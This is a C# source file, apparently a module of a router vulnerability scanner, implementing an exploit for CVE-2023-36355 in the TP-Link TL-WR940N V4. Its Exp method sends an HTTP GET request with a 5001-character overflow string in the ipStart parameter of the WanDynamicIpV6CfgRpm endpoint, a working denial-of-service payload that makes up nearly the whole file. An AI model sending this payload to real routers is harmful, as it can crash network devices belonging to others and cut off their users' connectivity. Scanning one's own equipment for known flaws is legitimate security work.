namespace RouterScanner.Services.VulHub;

/// <summary>
/// TP-Link TL-WR940N V4 - Buffer OverFlow
/// <br/><see cref="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-36355"/>
/// </summary>
public sealed class CVE_2023_36355 : RouterVulHubBase<CVE_2023_36355>, IRouterVulHub
{
    public string CVE => "CVE-2023-36355";
    public string VulType => "拒绝服务";
    public string Production => "TP-Link";
    public List<string> Version => ["TL-WR940N V4"];


    public override async ValueTask<VulResult> Exp(CancellationToken cancellationToken = default)
    {
        StringBuilder txt = new();
        for (int i = 0; i <= 5000; i++)
        {
            txt.Append('A');
        }
        var rawText = $"""
            GET /userRpm/WanDynamicIpV6CfgRpm?ipStart={txt} HTTP/1.1
            Host: 192.168.2.1
            User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0
            """;

        var resp = await Http.SendAsync(rawText, SSL, cancellationToken).ConfigureAwait(false);
        if (!resp.IsSuccessStatusCode)
        {
            return OK(false);
        }

        var result = await resp.Content.ReadAsStringAsync(cancellationToken).ConfigureAwait(false);
        return OK();
    }
}
